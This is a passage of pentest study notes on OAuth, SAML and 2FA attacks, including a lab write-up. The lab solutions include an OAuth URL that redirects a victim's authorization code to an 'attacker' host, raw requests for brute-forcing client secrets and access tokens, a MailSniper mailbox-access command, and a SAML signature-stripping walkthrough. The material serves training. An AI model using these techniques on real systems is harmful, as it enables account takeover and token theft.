href="https://johnermac.github.io/notes/ewptx/authenticationsso/#oauth-attack-scenario-4"></a></strong></h3><p id="ae914d0e-590f-4b25-aec4-ea6bb0a7bac4" class="">CSRF on the Authorization Response</p><ul id="feaef514-f030-419b-86e4-ee13c0d8e5b6" class="bulleted-list"><li style="list-style-type:disc">OAuth 2.0 provides security against CSRF-like attacks through the state parameter. This parameter is passed in the 2nd and 3rd request of the OAuth <strong>dance</strong>. It acts like a CSRF token.</li></ul><p id="8daa66ca-3f26-43a8-a2fa-d28b50fbbe74" class="">In newer implementations of OAuth, this paramater is not required and is optional.</p><blockquote id="1e270e77-bd6c-403c-b7d2-62e853ea08c4" class="">If you come across in an implementation where this parameter is not utilized, you can try the attack flow on your right.</blockquote><figure id="b2458977-e3ab-46a4-853b-e0e5d4993999" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/89.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/89.png"/></a></figure><h2 id="c242a660-14a6-4470-a225-46335e10fdee" class=""><strong>Security Assertion Markup Language (SAML)</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#security-assertion-markup-language-saml"></a></strong></h2><p id="401ab849-39d3-4c5b-8ea1-d50031e9f811" class="">Official documentation:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e9fada-0c05-4c40-b776-9c44cfc656d8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-tech-overview-2.0-cd-02.html#2.Overview|outline
+</code></pre><ul id="f4672cf9-3a94-41e6-8bdf-e4eb505233bf" class="bulleted-list"><li style="list-style-type:disc">OASIS SAML defines an XML-based framework For describing and exchanging security information between on-line business partners.</li></ul><ul id="42ed8aed-b2c2-44aa-9c43-958793c492d5" class="bulleted-list"><li style="list-style-type:disc">it defines precise syntax and rules For requesting, creating, communicating, and using these SAML assertions.</li></ul><figure id="48b6f454-c8c4-4e65-b6ba-054e5407deb8" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/90.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/90.png"/></a></figure><h3 id="b2961680-e760-43ea-8707-245f8004944e" class=""><strong>SAML Security Considerations</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#saml-security-considerations"></a></strong></h3><p id="07498785-a617-414a-a681-aa4b001ec11a" class="">An attacker may interfere during step 5 in the SAML Workflow and tamper with the SAML response sent to the service provider (SP). Values of the assertions released by IDP may be replaced this way.</p><ul id="b9c9fe47-6c4e-4ff4-8890-abd590ec2db6" class="bulleted-list"><li style="list-style-type:disc">An insecure SAML implementation may not verify the signature, allowing account hijacking</li></ul><p id="0f2ed12f-d734-462c-9fc5-88f0ceb42872" class="">An XML canonicalization transform is employed while signing the XML document, to produce the identical dignature For logically or semantically similar documents.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3b9b4809-446b-46a1-ba9c-ed723cb24fd2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://developer.okta.com/blog/2018/02/27/a-breakdown-of-the-new-saml-authentication-bypass-vulnerability#cryptographic-signing-issues
+</code></pre><figure id="6d7c262f-cb07-4481-8eb7-f8069606a955" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/91.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/91.png"/></a></figure><h3 id="8b3cdeee-3851-4c4c-a1d0-fb924fd7702a" class=""><strong>SAML Attack Scenario</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#saml-attack-scenario"></a></strong></h3><p id="e2085dc4-e68b-41bf-8b07-39373d90bd24" class="">Suppose that we are assessing a SAML implementation</p><p id="838b23ac-05a5-4668-aa63-d36d54b6a7d4" class="">We want to check if an attacker is able to successfully tamper with the SAML response sent to the service provider (SP). In essence, we want to check if an attacker can replace the values of the assertions released by the IDP.</p><figure id="692f50ea-6d37-4b09-b4be-3d4fe886ebcb" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/92.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/92.png"/></a></figure><p id="cf245c35-437d-4f0c-9873-c702559c4f49" class="">So, we copy the SAML Response (using BURP)</p><p id="02ae9a6a-63b0-4d10-ab00-8c8f7f837c65" class="">and programmatically change the username in the XML to one of an identified admin. The attack was not successful</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0066cf77-5dcd-4cad-a7f6-405676645684" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Invalid Signature on SAML Response
+</code></pre><p id="c74e7384-93da-4911-8d25-e33b975876fc" class="">Does this mean that the SAML implementation is secure? Lets try performing a signature stripping attack before saying so.</p><p id="73029b08-fd12-4f63-99a3-7f0afad578a2" class="">During signature stripping attacks against SAML, we simply remove the value of SignatureValue (the tag remains)</p><ul id="0cf2aa08-f2ca-4acb-b47a-f2671b03ecf2" class="bulleted-list"><li style="list-style-type:disc">All we have to do is encode everything again and submit our crafted SAML Response</li></ul><ul id="214ccf87-f20a-440f-8ae5-9d003814369f" class="bulleted-list"><li style="list-style-type:disc">To our surprise, the remote server accepted our crafted request letting us log in as the targeted admin user</li></ul><figure id="072177ed-6825-4e0e-b488-764995452594" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/93.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/93.png"/></a></figure><blockquote id="55139b0f-037c-470b-a0f0-2463143e3f9b" class="">Have signature strpping attacks in mind, when assessing SAML implementations</blockquote><h3 id="736856c3-eea6-4f6f-9d1f-6568df1bfde9" class=""><strong>Resources</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#resources"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e40dfb6d-6cb2-4344-96b5-1154b56985f2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://www.economyofmechanism.com/github-saml
+- https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e
+# its a BURP extension
+</code></pre><h2 id="26efbb6a-383c-4b1c-95ef-bcbe8e6b472c" class=""><strong>Common 2FA Bypasses</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#common-2fa-bypasses"></a></strong></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e161b919-dada-4231-a1e8-396e2cd236aa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Brute Force (when a secret of limited length is utilized)
+- Less common interfaces (mobile app, XMLRPC, API instead of web)
+- Forced Browsing
+- Predictable / Reusable Tokens
+</code></pre><h3 id="7e58775f-ae22-4b2e-bcfc-b19dbaf7ad17" class=""><strong>Less common interfaces</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#less-common-interfaces"></a></strong></h3><ol type="1" id="25e64414-f2b6-4180-84d3-a63ba367607e" class="numbered-list" start="1"><li>How attackers usually bypass 2FA during MS Exchange attacks</li></ol><ol type="1" id="94665959-d37f-445d-b3b8-6845200c9b36" class="numbered-list" start="2"><li>How we were able to bypass the 2FA implementation of a stock/insurance management website</li></ol><h3 id="8ee16f1d-526a-4852-b244-bc749a29e958" class=""><strong>2FA Bypass Scenario 1</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#2fa-bypass-scenario-1"></a></strong></h3><p id="f2cbb8ef-8cc4-44f5-b41a-12d0d719e8fe" class="">Exchange Web Services (EWS) is a remote access protocol</p><ul id="322ef178-91fd-4459-beaf-21cf92ad90b9" class="bulleted-list"><li style="list-style-type:disc">Its essentially SOAP over HTTP is used prevalently across applications, Windows mobile devices etc., and especially in newer versions of Exchange</li></ul><p id="71f642ac-1a14-4534-bf63-6f06121256e6" class="">Such as attack against Exchange can be performed using the MailSniper tool</p><p id="adc0ba3f-3e59-4b24-9dd7-accef7525371" class="">→ https://github.com/dafthack/MailSniper</p><p id="d69e629e-8587-4e1e-9731-50b732e3efd5" class="">// after identifying valid credentials</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e65dddb3-7b41-4ea0-b7ce-669c978e9bba" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Import-Module .\MailSniper.ps1
+Invoke-SelfSearch -Mailbox target@domain.com -ExchHostname mail.domain.com -remote
+</code></pre><ul id="f13a7eee-aaf7-4bd9-8f60-47eb933a558a" class="bulleted-list"><li style="list-style-type:disc">Trying the above tool on our testing domain, <strong>ELS</strong>, against the 2FA protected JeremyDoyle@els.local account returned the following.</li></ul><ul id="3da547e7-03cd-40f9-9341-21da04f61b8d" class="bulleted-list"><li style="list-style-type:disc">Access to the users mailbox was achieved using only the identified credentials.</li></ul><ul id="829e21de-22e9-4a70-8c93-2455b1b0c6c6" class="bulleted-list"><li style="list-style-type:disc">2FA was successfully subverted</li></ul><figure id="302a62e8-aea1-45bc-88e8-2841753efea6" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/94.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/94.png"/></a></figure><h3 id="702b50b5-60ac-468b-b7e6-d83c832b58ee" class=""><strong>2FA Bypass Scenario 2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#2fa-bypass-scenario-2"></a></strong></h3><p id="40674d07-ff9d-4f88-8326-f53968e1970a" class="">During an external pentest, we came across a 2FA implementation on a web application that was related to stock/insurance management. As part of the assessment, we tried to bypass the 2FA implementation by leveraging the fact that the mobile <strong>channel</strong> didnt offer a 2FA option</p><p id="e16d68ad-bd63-4d43-98fb-1b043c52ddbf" class="">A malicious non-2FA user somehow find a 2FA-users credentials (For example through a social engineering attack)</p><ul id="3f0a33c3-95f2-41f2-8cc7-13451097b5bd" class="bulleted-list"><li style="list-style-type:disc">The malicious user wants to login, using the acquired credentials, through the web app and not through the mobile app since the web app has additional functionality.</li></ul><ul id="3456ecdb-eaed-4b56-b756-ce47a1220f12" class="bulleted-list"><li style="list-style-type:disc">To achieve that he will have to find a way to bypass the 2FA mechanism in place</li></ul><h3 id="00add076-6aa3-4b9f-a27d-3d12b0173f13" class=""><strong>Step by Step</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#step-by-step"></a></strong></h3><ol type="1" id="2d012e96-a338-4c91-9808-11bba4704fbd" class="numbered-list" start="1"><li>We logged in through the mobile application as a non-2FA user (the attacker), wrote down the encrypted CSRF token For later use and kept the session alive</li></ol><figure id="c0fb976d-aae2-4f45-8a4c-f07d0190acdc" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/95.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/95.png"/></a></figure><ol type="1" id="642c5a41-236e-465d-859c-adfdadfe7644" class="numbered-list" start="1"><li>We initiated a login sequence as the 2FA user, whose credentials were acquired, through the web app but manipulated the login sequence requests so that they were processed through the mobile applications backend.</li></ol><ul id="45feb9fd-6c22-46c8-b957-d1e13e3865b0" class="bulleted-list"><li style="list-style-type:disc">During the above mentioned login sequence manipulation steps we used the cookie values supplied by the web app backend</li></ul><figure id="34f1ec4e-bae9-4236-a7b5-fcfd52ec0bd2" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/96.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/96.png"/></a></figure><figure id="d3053648-3fac-4cf1-9457-0c0802582a80" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/97.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/97.png"/></a></figure><ol type="1" id="6bacbca1-9b05-4de9-b693-4f7431e364e2" class="numbered-list" start="1"><li>We performed a POST request through the browser requesting</li></ol><ul id="6325fb4f-5cd2-4fb1-9ae8-8517172d00fc" class="bulleted-list"><li style="list-style-type:disc">https://uat.xxxx.com/xxxParticipant/mobile/services/initial_load.htm:ENC=[attacker CSRF token]</li></ul><ul id="0cdb8437-4b35-4b99-8777-c5fa9bd3ff0d" class="bulleted-list"><li style="list-style-type:disc">using the CSRF token of the non-2FA user (the attacker) and the 2FA users cookies, as mentioned above.</li></ul><figure id="d01019aa-7420-4e06-9d0b-842d356aeecd" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/98.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/98.png"/></a></figure><ol type="1" id="e4997cf0-d407-4e65-81cb-99a002ed87bf" class="numbered-list" start="1"><li>The web app responded with a 403 Authorization error message, twice.</li></ol><figure id="0c15a895-e4fa-4c54-ab75-e62c49ef42bf" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/99.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/99.png"/></a></figure><ol type="1" id="fdd408a9-0476-4b78-bd26-c35f56b7bff5" class="numbered-list" start="1"><li>We performed a GET request through the browser requesting</li></ol><ul id="1281d3be-1921-4a69-8c98-33dbf2b59b5b" class="bulleted-list"><li style="list-style-type:disc">https://uat.xxxx.com/xxxParticipant</li></ul><ul id="f8f5f815-e2c4-4438-ba0c-ffb8bc0e0094" class="bulleted-list"><li style="list-style-type:disc">And we were finally able to browser through the web app as the 2FA user bypassing the 2FA mechanism in place.</li></ul><figure id="40b54fa7-695b-48c5-90ff-d8949ecd3c46" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/100.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/100.png"/></a></figure><h2 id="af074fe0-0d29-463e-ad94-011c87677150" class=""><strong>Lab</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#lab"></a></strong></h2><p id="eb82e009-d577-487b-97d8-512239cc4de8" class="">Network Configuration</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3c4645d4-65aa-496b-8f3b-2eb847d18972" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- The target application can be found at http://gallery:3005
+- The username is koen and the password is password.
+</code></pre><h3 id="e7c03572-3d74-40cb-82cd-52887cdade9e" class=""><strong>Tasks</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#tasks"></a></strong></h3><p id="43879c04-51a8-4ae1-96fa-5b9bf510a8f6" class="">Task 1. Create a code stealing PoC:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aef7da03-624f-4fcd-a472-40066f23b064" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Craft an URL that can be sent to a victim in order to steal the authorization code once he/she logs in into the /oauth endpoint.
+- You can use the following data: the response type is &quot;code&quot;, the scope is &quot;view_gallery&quot; and the client_id is &quot;photoprint&quot;.
+</code></pre><p id="8a074543-b38c-46fd-9f92-47667379f456" class="">Task 2. Use the acquired code to bruteforce the client secret:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8ccce568-f55c-4e6e-b1f3-8270731c8a7c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Use a POST request to the /token endpoint in order to bruteforce the  client secret.
+- Consult with OAuth&#x27;s documentation to recreate the  request. The grant type is &quot;authorization_code&quot;
+</code></pre><p id="71991c1f-a729-47f5-98fd-2af657a07f9f" class="">Task 3. Discover another token vulnerability:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cafff613-14c8-40b4-a0fa-fd5b63e9bab2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Discover another vulnerability by abusing the /photos/me?access_token= endpoint.
+</code></pre><h3 id="c155e3dc-3d99-480e-bd31-1fa5c65ca2dd" class=""><strong>Solutions</strong><strong><a href="https://johnermac.github.io/notes/ewptx/authenticationsso/#solutions"></a></strong></h3><p id="1e76fb81-d798-40ce-98b3-f2fec7658714" class="">Below, you can find solutions for each task. Remember though, that you can follow your own strategy, which may be different from the one explained in the following lab.</p><p id="a44ea83c-02c3-4d14-80cf-262790999034" class="">Task 1. Create a code stealing PoC</p><p id="ed3c040c-0624-428b-8bca-2859f40fb57f" class="">Based on OAuth’s documentation available on https://tools.ietf.org/html/rfc6749 you can construct the following GET request. Note that you have to be logged out upon visiting this URL.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3cc49fba-2698-4d66-97bb-fcfffbc991ce" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://gallery:3005/oauth/authorize?response_type=code&amp;redirect_uri=http%3A%2F%2Fattacker%2Fcallback&amp;scope=view_gallery&amp;client_id=photoprint
+</code></pre><p id="8c82fcea-45dc-4470-bcf6-592f536551c8" class="">Upon logging in, there is a <strong>consent screen</strong>, which has to be accepted, just like a regular login via OAuth.</p><p id="5384d9d5-ff64-4072-b7d9-dbceb5442147" class="">Then, the user is redirected to the <strong>attacker</strong> website with the authorization code in the callback value. Any user that is sent the above URL and will log in via it, will make a request to the attacker website disclosing the authorization code.</p><p id="e1684ab1-e925-4286-ad64-3f3ecf665715" class="">The underlying vulnerability is an unvalidated redirection.</p><p id="d62ffe8b-41d3-46a8-a549-04c669bc4058" class="">Task 2. Use the acquired code to bruteforce the client secret</p><p id="b22209a3-ba22-4861-be41-edd464d22b80" class="">Based on a sample Token request (https://auth0.com/docs/api-auth/tutorials/authorization-code-grant) you can construct the following POST request.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="06449221-3b79-4e38-89e4-eb88de649c2d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">POST /token HTTP/1.1
+Host: gallery:3005
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 137
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+redirect_uri=http%3A%2F%2Fgallery%3A3005%2Fcallback&amp;grant_type=authorization_code&amp;client_id=photoprint&amp;client_secret=§guess§&amp;code=44438Note:
+</code></pre><ul id="0bc42d98-08f2-4f11-8e7c-ad402048489f" class="bulleted-list"><li style="list-style-type:disc">Copy-pasting the above request may result in formatting issues that will cause the HTTP request to be malformed.</li></ul><ul id="120d4f2a-d71a-4ac6-8ebb-d7843fcd48b5" class="bulleted-list"><li style="list-style-type:disc">The best way to reproduce that request is to log in as described in the manual (by obtaining the first code), capture the request using Burp and send it to Repeater.</li></ul><ul id="c55e78c8-3e38-4a00-baef-ba9d54b0375f" class="bulleted-list"><li style="list-style-type:disc">Using Burp Intruder and a wordlist (we used Rockyou-10 available here) you can bruteforce the client secret.</li></ul><p id="80ae0377-2c4c-4d5a-af75-9431928256f4" class="">After starting the attack, soon we realize that the client secret is <strong>secret</strong>.</p><p id="57dc5e78-da36-4243-b5b4-074a6eda6e9f" class="">In the Repeater window:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3e76dd6c-51fc-486c-b153-5d55f637fd66" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">POST /token HTTP/1.1
+Host: gallery:3005
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 136
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+redirect_uri=http%3A%2F%2Fgallery%3A3005%2Fcallback&amp;grant_type=authorization_code&amp;client_id=photoprint&amp;client_secret=secret&amp;code=44438
+Note: Specify the code that you received in the response.
+The response access token can now be supplied to the /photos/me?access_token= endpoint.
+GET /photos/me?access_token=35580 HTTP/1.1
+Host: gallery:3005
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre><blockquote id="3c91b130-1699-4d55-8962-dbba59579933" class="">[Note] Make sure to replace the access code in the above request with the one you get back from the request before this one.</blockquote><p id="20dd60a0-488d-4195-81ef-55d1109eecdf" class="">Task 3. Discover another token vulnerability</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ff173f81-aaf8-4ba4-9cc3-8dda9d177291" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># At /photos/me?access_token=[code] you are able to bruteforce the valid token. This will require the following Burp Intruder configuration:
+
+GET /photos/me?access_token=§§ HTTP/1.1
+Host: gallery:3005
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
